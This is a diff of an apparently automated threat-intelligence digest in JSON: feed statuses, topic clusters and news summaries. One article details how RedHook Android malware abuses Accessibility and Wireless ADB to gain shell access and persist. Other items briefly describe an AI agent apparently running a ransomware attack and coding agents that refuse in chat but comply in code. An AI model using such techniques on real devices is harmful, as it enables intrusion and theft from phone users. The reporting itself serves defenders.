@@ -1,8 +1,8 @@
 {
-  "generated_at": "2026-07-12T15:03:47.339119+00:00",
+  "generated_at": "2026-07-12T16:06:26.354177+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
-  "total_items": 2278,
+  "total_items": 2303,
   "feed_status": {
     "CrowdStrike": {
       "url": "https://www.crowdstrike.com/blog/feed/",
@@ -10,13 +10,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
-    },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
     },
     "Unit 42": {
       "url": "https://unit42.paloaltonetworks.com/feed/",
@@ -39,12 +32,33 @@
       "item_count": 0,
       "in_window_count": 0
     },
+    "Microsoft Threat Intelligence": {
+      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "Trend Micro Research": {
       "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 25,
       "in_window_count": 0
+    },
+    "Cisco Talos": {
+      "url": "https://feeds.feedburner.com/feedburner/Talos",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 3
     },
     "Sekoia": {
       "url": "https://blog.sekoia.io/feed/",
@@ -60,12 +74,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Microsoft Threat Intelligence": {
-      "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 2
     },
     "NCSC UK": {
       "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
@@ -74,18 +88,11 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "Cisco Talos": {
-      "url": "https://feeds.feedburner.com/feedburner/Talos",
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 15,
-      "in_window_count": 3
-    },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
       "in_window_count": 2
     },
     "SANS Internet Storm Center": {
@@ -94,20 +101,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
-    },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 3
-    },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
     },
     "Horizon3 Attack Research": {
       "url": "https://horizon3.ai/feed/",
@@ -123,13 +116,6 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 78,
-      "in_window_count": 0
-    },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
       "cohort": "offensive_vulnerability_research",
@@ -144,18 +130,11 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 19
-    },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
+      "item_count": 78,
       "in_window_count": 0
     },
     "PortSwigger Research": {
@@ -163,6 +142,27 @@
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 40,
+      "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 19
+    },
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 3
+    },
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "watchTowr Labs": {
@@ -186,15 +186,15 @@
       "item_count": 10,
       "in_window_count": 2
     },
-    "Active Countermeasures": {
-      "url": "https://www.activecountermeasures.com/feed/",
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
     },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
+    "Active Countermeasures": {
+      "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -242,13 +242,6 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
     "AWS Security Blog": {
       "url": "https://aws.amazon.com/blogs/security/feed/",
       "cohort": "cloud_identity_infrastructure",
@@ -270,6 +263,13 @@
       "item_count": 100,
       "in_window_count": 9
     },
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
@@ -284,12 +284,12 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Wiz Research": {
-      "url": "https://www.wiz.io/feed/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 4
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Cloudflare Security": {
       "url": "https://blog.cloudflare.com/tag/security/rss/",
@@ -298,12 +298,19 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
+    "Wiz Research": {
+      "url": "https://www.wiz.io/feed/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 4
+    },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 20,
-      "in_window_count": 1
+      "in_window_count": 0
     },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
@@ -319,11 +326,11 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 20,
+      "item_count": 10,
       "in_window_count": 0
     },
     "Google Cloud Security": {
@@ -333,13 +340,6 @@
       "item_count": 20,
       "in_window_count": 19
     },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
       "cohort": "ransomware_ecrime_financial_crime",
@@ -347,19 +347,19 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Interconnects": {
-      "url": "https://www.interconnects.ai/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "The Record": {
       "url": "https://therecord.media/feed",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 5,
       "in_window_count": 5
+    },
+    "Interconnects": {
+      "url": "https://www.interconnects.ai/feed",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
     },
     "BleepingComputer": {
       "url": "https://www.bleepingcomputer.com/feed/",
@@ -374,6 +374,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
+    },
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "GreyNoise": {
       "url": "https://www.greynoise.io/blog/rss.xml",
@@ -403,33 +410,12 @@
       "item_count": 50,
       "in_window_count": 22
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 10
-    },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
     },
     "Team Cymru": {
       "url": "https://www.team-cymru.com/post/rss.xml",
@@ -445,8 +431,43 @@
       "item_count": 10,
       "in_window_count": 6
     },
-    "Reddit r/netsec": {
-      "url": "https://www.reddit.com/r/netsec/.rss",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 1
+    },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 50
+    },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -459,8 +480,15 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -480,41 +508,6 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
-    },
-    "Reddit r/AskNetsec": {
-      "url": "https://www.reddit.com/r/AskNetsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
       "cohort": "cyber_news_breach_reporting",
@@ -522,12 +515,12 @@
       "item_count": 100,
       "in_window_count": 27
     },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
+    "Reddit r/netsec": {
+      "url": "https://www.reddit.com/r/netsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
-      "in_window_count": 25
+      "in_window_count": 11
     },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
@@ -542,6 +535,13 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 1
+    },
+    "Reddit r/AskNetsec": {
+      "url": "https://www.reddit.com/r/AskNetsec/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 14
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -819,7 +819,7 @@
         ]
       },
       "cluster_count": 2,
-      "article_count": 3,
+      "article_count": 2,
       "cohesion": 0.2,
       "shared_strong_signals": [
         "Apple iOS/macOS"
@@ -832,8 +832,45 @@
       ],
       "links": [
         "https://www.rapid7.com/blog/post/pt-weekly-metasploit-update-exploits-for-flowiseai-csv-agent-and-macos-package-kit",
-        "https://www.reddit.com/r/cybersecurity/comments/1utl1xt/google_sponsored_ad_for_claude_mac_app_leads_to_a/",
         "https://thehackernews.com/2026/07/compromised-jscrambler-8140-npm-release.html"
+      ]
+    },
+    {
+      "label": "ransomware extortion targeting Android",
+      "anchor_signal": "Android",
+      "theme_key": "android",
+      "dominant_features": {
+        "threat_categories": [
+          "ransomware_extortion",
+          "phishing_social_eng"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government"
+        ],
+        "affected_products": [
+          "Android"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 5,
+      "cohesion": 0.205,
+      "shared_strong_signals": [
+        "Android"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "3ee1d54d9d",
+        "cad05b2d4e",
+        "31e0196a7c"
+      ],
+      "links": [
+        "https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/",
+        "https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/",
+        "https://www.bleepingcomputer.com/news/security/redhook-android-malware-now-uses-wireless-adb-for-shell-access/",
+        "https://thehackernews.com/2026/07/redwing-maas-packages-android-bank.html",
+        "https://www.reddit.com/r/AskNetsec/comments/1utdtej/reversing_promon_shield_from_emulator_detection/"
       ]
     },
     {
@@ -948,38 +985,6 @@
       ]
     },
     {
-      "label": "ransomware extortion targeting Android",
-      "anchor_signal": "Android",
-      "theme_key": "android",
-      "dominant_features": {
-        "threat_categories": [
-          "ransomware_extortion"
-        ],
-        "affected_industries": [
-          "financial_services"
-        ],
-        "affected_products": [
-          "Android"
-        ]
-      },
-      "cluster_count": 2,
-      "article_count": 2,
-      "cohesion": 0.2,
-      "shared_strong_signals": [
-        "Android"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "3ee1d54d9d",
-        "cad05b2d4e"
-      ],
-      "links": [
-        "https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/",
-        "https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/"
-      ]
-    },
-    {
       "label": "Microsoft Defender vulnerability activity",
       "anchor_signal": "Microsoft Defender",
       "theme_key": "microsoft-defender",
@@ -1049,17 +1054,7 @@
     "convergence": [
       {
         "cluster_id": "598aa947b4",
-        "pair": "CVE-2024-27822 + Anthropic/Claude",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "598aa947b4",
         "pair": "CVE-2024-27822 + Apple iOS/macOS",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "598aa947b4",
-        "pair": "CVE-2026-41264 + Anthropic/Claude",
         "first_observation": true
       },
       {
@@ -1120,6 +1115,16 @@
       {
         "cluster_id": "8b4ae517ee",
         "pair": "CVE-2026-40138 + Scattered Spider",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "8b4ae517ee",
+        "pair": "CVE-2026-40138 + Anthropic/Claude",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "8b4ae517ee",
+        "pair": "CVE-2026-40139 + Scattered Spider",
         "first_observation": true
       }
     ],
@@ -1187,18 +1192,27 @@
         "weeks_observed": 3
       }
     ],
-    "tier_inversion": []
+    "tier_inversion": [
+      {
+        "cluster_id": "673009765e",
+        "title": "CVE-2026-47291: Windows Critical Unauthenticated Remote Code Execution in HTTP.sys",
+        "primary_source": "Reddit r/netsec",
+        "strong_signals": [
+          "CVE-2026-47291"
+        ]
+      }
+    ]
   },
   "items": [
     {
-      "source": "Reddit r/cybersecurity",
+      "source": "Reddit r/netsec",
       "cohort": "reddit_practitioner_osint",
       "category": "reddit_practitioner_osint",
-      "title": "Passive security measurement of 10,020 .it domains: CSP, cookies, TLS and email authentication",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1uuhlp1/passive_security_measurement_of_10020_it_domains/",
-      "published": "2026-07-12T14:52:36+00:00",
-      "summary": "I recently finished a passive security measurement study of .it domains and wanted to share some of the results here for feedback. The dataset includes 10,020 successfully scanned .it domains, covering essentially the entire .it slice of the Tranco Top 1M list (snapshot: 2026-07-08). The study is strictly passive. It only performs standard HTTP requests, TLS handshakes and DNS lookups. No exploitation, brute forcing, vulnerability scanning or any other active probing. Some headline results: HTTP security headers - X-Frame-Options: 41.8% - HSTS: 32.8% - CSP: 18.7% - Permissions-Policy: 11.2% Content Security Policy - 1,646 CSPs parsed at directive level - only 0.7% met a documented restrictiveness criterion - 45.4% still included unsafe-inline Cookies (7,240 observed) - ~52% missing SameSite - ~52% missing HttpOnly - ~48% missing Secure TLS - No weak cipher suites observed - 87.3% of domains already support TLS 1.3 Email authentication - SPF: 55.5% - DMARC: 43.8% - DKIM: 36.6% The DKIM ",
-      "author": "/u/Joman1102",
+      "title": "CVE-2026-47291: Windows Critical Unauthenticated Remote Code Execution in HTTP.sys",
+      "link": "https://www.reddit.com/r/netsec/comments/1uuh80d/cve202647291_windows_critical_unauthenticated/",
+      "published": "2026-07-12T14:37:38+00:00",
+      "summary": "A critical severity vulnerability with a CVSS score of 9.8 in the Windows HTTP protocol stack (HTTP.sys) allows for unauthenticated remote code execution via an integer overflow. Because HTTP.sys processes incoming HTTP requests in kernel mode, this flaw carries a high impact, potentially allowing an unauthenticated attacker to execute arbitrary code with system privileges. The underlying mechanics of this specific bug, including the exact assembly-level modifications, affected functions, and the execution path, have been thoroughly mapped out in the attached link. This includes the associated WinDbg reproduction details. It seems like the era of waiting around to understand what actually changes under the hood on Patch Tuesday is largely behind us. Beyond this specific HTTP.sys analysis, the platform continuously tracks and hosts real-time structural breakdowns for the broader Windows patch ecosystem, making it a useful resource for footprinting similar kernel-level differentials. sub",
+      "author": "/u/Emergency_Stable_923",
       "in_window": true,
       "taxonomy": {
         "threat_categories": [],
@@ -1206,17 +1220,23 @@
         "affected_industries": [],
         "affected_products": [],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-47291"
+        ],
         "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "news_report",
+        "urgency_signals": [
+          "preauth_unauth"
+        ],
+        "content_type": "vulnerability_disclosure",
         "confidence_tier": "tier_5_chatter",
         "role_map": {},
         "weak_tags": {
           "products": []
         }
       },
-      "score": 4
+      "score": 12,
+      "full_body": "",
+      "fetch_status": "fetch_failed:HTTPError"
     },
     {
       "source": "BleepingComputer",
@@ -1229,9 +1249,15 @@
       "author": "Bill Toulas",
       "in_window": true,
       "taxonomy": {
-        "threat_categories": [],
+        "threat_categories": [
+          "phishing_social_eng"
+        ],
         "actor_attribution": [],
-        "affected_industries": [],
+        "affected_industries": [
+          "financial_services",
+          "government",
+          "critical_infrastructure"
+        ],
         "affected_products": [
           "Android"
         ],
@@ -1248,17 +1274,19 @@
           "products": []
         }
       },
-      "score": 6
+      "score": 6,
+      "full_body": "RedHook Android malware now uses Wireless ADB for shell access By Bill Toulas July 12, 2026 10:27 AM 0 A new version of the RedHook Android malware abuses the Android Wireless Debugging (Wireless ADB) mechanism in a novel way to gain shell-level privileges without requiring a computer connection. Researchers at cybersecurity company Group-IB analyzed the new release of the mobile malware and say that it significantly expands its capabilities compared to the previous variant documented in 2025. At the same time, the malware retains its remote access trojan (RAT) features, allowing it to stream the screen, intercept keystrokes, automate UI interactions, and steal credentials. Autonomous Wireless ADB abuse ADB (Android Debug Bridge) is Google's debugging interface that lets a user control an Android device from a command line. The system, which runs on an Android device as an ADB daemon, enables executing shell commands from a computer running the ADB client. Wireless ADB, first introduced in Android 11, provides the same capability wirelessly, without requiring the devices to be linked via a USB cable. RedHook essentially turns the phone into its own ADB client by tricking the victim into granting it Accessibility permissions, which let it automatically manipulate Settings, enable Developer Options, and activate Wireless Debugging. After that, the malware retrieves the pairing code displayed on the screen and connects to the phone’s ADB service via the loopback interface (127.0.0.1). Once paired, the malware gains shell (UID 2000) privileges, which are significantly more powerful than those available to normal Android apps, though not root-level. The entire attack chain does not require the device to be rooted, so it works across all Android devices as long as the user is tricked into approving the Accessibility Service permission request. Next, the malware deploys a Shizuku-based framework to execute shell commands, grant itself additional permissions, modify protected Android settings, silently install or remove applications, and perform various operations without displaying user dialogs. Shizuku is a legitimate Android utility popular among power users and developers, and does not require a rooted device. RedHook executes Shizuku code as part of its attack chain, using it as a privileged server (libmx.so) to invoke privileged Android APIs as UID 2000. RedHook malware attack chain Source: Group-IB According to Group-IB's report , the current version of the malware supports 53 server-issued commands, which include: Screen streaming and screenshot capturing Simulate taps, swipes, gestures, dragging, and long clicks Device locking/unlocking Install, launch, and uninstall apps Collect contacts, SMS, and applications Create overlays or fake verification dialogs Activate the camera Reboot the device The malware’s multiple persistence mechanisms are also highlighted in Group-IB’s report. RedHook uses silent audio playback to increase process priority, WakeLocks to prevent CPU sleep, and two services that restart each other when one is terminated. Other mechanisms include a five-minute watchdog alarm, automatic restart after device boot, and setting oom_score_adj to -1000 to reduce the likelihood of being killed when available system memory is low. The latest version of RedHook is distributed through social engineering, via messages and phone calls where attackers impersonate government agencies or financial institutions to direct victims to fake Google Play sites. Android users are advised to install apps only from Google Play, scrutinize requested permissions at installation, and ensure that Play Protect is active on the device. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related A",
+      "fetch_status": "ok"
     },
     {
-      "source": "Reddit r/cybersecurity",
+      "source": "Reddit r/AskNetsec",
       "cohort": "reddit_practitioner_osint",
       "category": "reddit_practitioner_osint",
-      "title": "How do you prepare for SOC Analyst scenario-based interview questions?",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1uufqaj/how_do_you_prepare_for_soc_analyst_scenariobased/",
-      "published": "2026-07-12T13:37:36+00:00",
-      "summary": "What helped you get better at answering SOC Analyst scenario-based interview questions? submitted by /u/According_Holiday_26 [link] [comments]",
-      "author": "/u/According_Holiday_26",
+      "title": "Any recommendations for validating security controls against real TTPs?",
+      "link": "https://www.reddit.com/r/AskNetsec/comments/1uu9uud/any_recommendations_for_validating_security/",
+      "published": "2026-07-12T08:38:20+00:00",
+      "summary": "We have been doing quarterly pen tests for a while and I am starting to think we are mostly paying for a static report. By the time the findings arrive, the threat landscape has already shifted and most of the context has changed. It gives us a backward looking picture, not a current one. rn we run CrowdStrike on endpoints, Sentinel as our SIEM, and our dashboard coverage looks decent. From a control inventory point of view, we look fine. The problem is that we do not have anything that continuously validates whether these controls actually detect what they should across the whole kill chain, not only at the perimeter. What I want to understand is whether our detections stand up to real adversary behavior such as initial access, privilege escalation, lateral movement, and data exfiltration. I would like to map results back to MITRE ATT&CK so I can see real coverage gaps and prioritize remediation based on exploitability rather than just CVSS scores. Right now, that level of confidence ",
+      "author": "/u/Any_Yesterday_6617",
       "in_window": true,
       "taxonomy": {
         "threat_categories": [],
@@ -1317,243 +1345,6 @@
       "score": 10,
       "full_body": "Help Net Security July 12, 2026 Share Week in review: Accenture data breach, great open-source cybersecurity tools Here’s an overview of some of last week’s most interesting news, articles, interviews and videos: Securing the inbox: Where identity, brand and security meet Getting a verified logo to appear next to your email has traditionally meant having to work with two separate entities. You have to work with a DMARC partner for setting up DMARC and BIMI, then use a trusted Certificate Authority (CA) to purchase a Mark Certificate, and this means having to source a trusted partner for both which delays the project unnecessarily. Red Sift and GlobalSign have now folded both halves into a single package. Researchers make the case for a cybersecurity AI scientist Autonomous AI agents have started doing real security work. Language-model agents probe software for flaws, run penetration tests, and chain together attack steps that once needed a human operator. Research about security has stayed slower and more manual, built around expert scarcity and hand-designed experiments. A team at the Chinese Academy of Sciences wants to close that gap. In a recent paper, they define what they term the Cybersecurity AI Scientist. They describe a research system that moves from a question to experimental design, tool building, controlled execution, evaluation, and a written result on its own. OpenAI and Anthropic are pulling in different directions Companies are handing routine operational decisions to AI agents that plan, remember, and act on their behalf. These agents run on statistical models, and their behavior can drift across weeks and months. That drift opens a security gap outside the reach of standard monitoring tools. A study of about 1,080 open job postings at OpenAI and Anthropic maps where the two largest AI labs are taking this technology. Orbia CISO Miranda Ritchie on building security into sustainable infrastructure In this interview with Help Net Security, Miranda Ritchie, CISO at Orbia, talks about protecting industrial systems where software runs water, chemical and manufacturing processes. She explains why a cyber incident in these settings can harm people, equipment and the environment, and how spread-out sites and aging control hardware widen the risk. Your coding agent says no in chat and yes in the code Millions of developers share their keyboard with GitHub Copilot. Inside Visual Studio Code, it opens their files, writes and edits code, runs scripts, and reworks its own output across many turns. The safety testing that vets these agents still runs on chatbot rules: one harmful prompt, one response, graded alone. That rulebook misses where the real danger sits, according to a study from the Alan Turing Institute in London. Attackers exploit critical Adobe ColdFusion vulnerability (CVE-2026-48282) CVE-2026-48282, one of the maximum severity vulnerabilities patched in Adobe ColdFusion on June 30, 2026, has been targeted by attackers in the wild. Exploitation attempts were detected on July 2, through the honeypot sensors of cybersecurity threat-intelligence service KEVIntel, mere minutes after watchTowr researchers published a technical analysis of this and other ColdFusion flaws recently fixed by Adobe. Accenture acknowledges security incident following 35GB data theft claim Accenture appears to have suffered a data breach, the extent of which is currently unknown. On Monday, a threat actor going by the handle “888” posted on the cybercrime forum PwnForums, claiming to have breached the technology consulting company and stolen “just over 35gb of source codes” in July 2026. Attackers using Langflow flaw for credential harvesting (CVE-2026-55255) The US Cybersecurity and Infrastructure Security Agency (CISA) is warning about yet another Langflow vulnerability (CVE-2026-55255) leveraged by attackers in the wild. The flaw was added to the agency’s Known Exploited Vulnerabilities catalog on Tuesday, July 7, nearly two weeks a",
       "fetch_status": "ok"
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "JadePuffer — the first documented fully-autonomous AI ransomware attack, walked through end to end (Sysdig research)",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1uu92cl/jadepuffer_the_first_documented_fullyautonomous/",
-      "published": "2026-07-12T07:52:02+00:00",
-      "summary": "A human picked the target. From there, an AI agent ran the entire attack chain itself — reconnaissance, exploitation, credential theft, extortion notes — with the human only stepping back in at the end to negotiate. This is JadePuffer, based on Sysdig's published research. What stands out isn't just that AI was involved (plenty of \"AI-assisted\" attacks exist) — it's the evidence pointing to genuine autonomous reasoning at each stage rather than a scripted bot following a fixed playbook. I put together a sourced walkthrough of what actually happened, what got stolen, and why it matters even if you're not the one getting attacked: https://youtu.be/IB96Kw_EJSs submitted by /u/Fit_Menu7298 [link] [comments]",
-      "author": "/u/Fit_Menu7298",
-      "in_window": true,
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "credential_theft"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "incident_report",
-        "confidence_tier": "tier_5_chatter",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      },
-      "score": 8,
-      "full_body": "",
-      "fetch_status": "fetch_failed:HTTPError"
-    },
-    {
-      "source": "Reddit r/cybersecurity",
-      "cohort": "reddit_practitioner_osint",
-      "category": "reddit_practitioner_osint",
-      "title": "How common is it for US/European companies to hire remote cybersecurity contractors?",
-      "link": "https://www.reddit.com/r/cybersecurity/comments/1uu8th9/how_common_is_it_for_useuropean_companies_to_hire/",
-      "published": "2026-07-12T07:37:42+00:00",
